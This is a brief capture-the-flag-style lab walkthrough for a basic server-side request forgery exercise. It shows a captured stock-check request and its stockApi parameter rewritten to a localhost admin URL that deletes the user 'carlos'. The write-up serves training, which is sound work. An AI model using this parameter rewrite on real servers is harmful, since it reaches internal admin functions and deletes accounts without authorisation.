*** *** *** *** *** *** *** *** *** *** *** *
LAB-01 : Basic SSRF against the local server
*** *** *** *** *** *** *** *** *** *** *** *

- Access the lab and pick - View details
- At the bottom you will see - Check Stock

Initial request:

POST /product/stock HTTP/2
Host: 0a0000f30455b34b81187bea007400da.web-security-academy.net
Cookie: session=zOHO3dwNS0AmenAeR0uBKCyU9jkXhQO3
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a0000f30455b34b81187bea007400da.web-security-academy.net/product?productId=2
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
Origin: https://0a0000f30455b34b81187bea007400da.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1

Inspector decrypts stockApi line to readable text:

http://stock.weliketoshop.net:8080/product/stock/check?productId=2&storeId=1

So you need to change:
stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1
==
http://stock.weliketoshop.net:8080/product/stock/check?productId=2&storeId=1

to 

stockApi=http%3a%2f%2flocalhost%2fadmin%2fdelete%3fusername%3dcarlos
==
stockApi=http://localhost/admin/delete?username=carlos

This will not just access admin dashboard but also deletes user carlos and solves the LAB.
